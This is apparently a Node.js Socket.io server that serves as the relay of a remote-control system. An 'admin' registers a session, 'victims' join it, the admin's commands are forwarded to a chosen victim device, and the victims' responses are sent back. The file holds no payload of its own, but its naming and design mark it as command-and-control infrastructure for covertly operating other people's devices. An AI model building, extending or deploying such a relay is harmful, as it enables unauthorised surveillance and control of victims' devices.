const express = require("express");
const http = require("http");
const { Server } = require("socket.io");

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: "*", // Update this in production
  },
});

// Session state
const admins = {}; // sessionId -> adminSocketId
const victims = {}; // sessionId -> { victimId: socketId }
const pendingVictimJoins = {}; // sessionId -> victimId[]

io.on("connection", (socket) => {
  console.log(`🔌 New connection: ${socket.id}`);

  // --- Admin joins ---
  socket.on("admin-join", ({ sessionId }) => {
    if (!sessionId) return;
    admins[sessionId] = socket.id;
    if (!victims[sessionId]) victims[sessionId] = {};
    console.log(`🧑‍💻 Admin joined: ${sessionId}`);

    // Flush pending victim joins
    const pending = pendingVictimJoins[sessionId] || [];
    pending.forEach((victimId) => {
      socket.emit("victim-joined", { victimId });
    });
    delete pendingVictimJoins[sessionId];
  });

  // --- Victim joins ---
  socket.on("victim-join", ({ sessionId, victimId }) => {
    if (!sessionId || !victimId) return;

    if (!victims[sessionId]) victims[sessionId] = {};
    victims[sessionId][victimId] = socket.id;
    console.log(`📱 Victim ${victimId} joined session ${sessionId}`);

    const adminSocketId = admins[sessionId];
    if (adminSocketId) {
      io.to(adminSocketId).emit("victim-joined", { victimId });
    } else {
      if (!pendingVictimJoins[sessionId]) pendingVictimJoins[sessionId] = [];
      pendingVictimJoins[sessionId].push(victimId);
    }
  });

  // --- Admin sends command to victim ---
  socket.on("admin-to-victim", (payload) => {
    const { sessionId, cmd, type, victimId, role, params, data } = payload;
    const victimSocketId = victims[sessionId]?.[victimId];
    if (victimSocketId) {
      io.to(victimSocketId).emit("command", payload);
    } else {
      console.warn(`⚠️ Victim ${victimId} not found in session ${sessionId}`);
    }
  });

  // --- Victim sends response to admin ---
  socket.on("victim-to-admin", (payload) => {
    const { sessionId, cmd, type, victimId, role, params, data } = payload;
    const adminSocketId = admins[sessionId];
    if (adminSocketId) {
      io.to(adminSocketId).emit("response", payload);
    } else {
      console.warn(`⚠️ Admin not found for session ${sessionId}`);
    }
  });

  // --- Cleanup on disconnect ---
  socket.on("disconnect", () => {
    console.log(`❌ Disconnected: ${socket.id}`);

    // Remove from admins
    for (const [sessionId, adminSocketId] of Object.entries(admins)) {
      if (adminSocketId === socket.id) {
        delete admins[sessionId];
        delete pendingVictimJoins[sessionId];
        console.log(`🧹 Admin ${sessionId} disconnected`);
        return;
      }
    }

    // Remove from victims
    for (const sessionId of Object.keys(victims)) {
      const entries = victims[sessionId];
      const victimId = Object.keys(entries).find(
        (id) => entries[id] === socket.id,
      );
      if (victimId) {
        delete victims[sessionId][victimId];
        const adminSocketId = admins[sessionId];
        if (adminSocketId) {
          io.to(adminSocketId).emit("victim-left", { victimId });
        }
        console.log(`🧹 Victim ${victimId} disconnected from ${sessionId}`);
        return;
      }
    }
  });
});

const PORT = 3000;
server.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
